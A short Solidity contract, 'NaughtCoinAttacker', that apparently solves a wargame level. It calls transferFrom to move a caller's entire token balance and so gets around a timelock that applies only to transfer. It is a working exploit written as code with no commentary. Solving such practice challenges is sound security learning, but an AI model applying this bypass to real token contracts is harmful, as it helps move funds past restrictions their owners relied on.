pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}
contract NaughtCoinAttacker {
    address public naughtCoinAddress;

    constructor(address _naughtCoinAddress) {
        naughtCoinAddress = _naughtCoinAddress;
    }

    function attack() public {
        IERC20 naughtCoin = IERC20(naughtCoinAddress);
        naughtCoin.transferFrom(msg.sender, address(this) , naughtCoin.balanceOf(msg.sender));
    }
}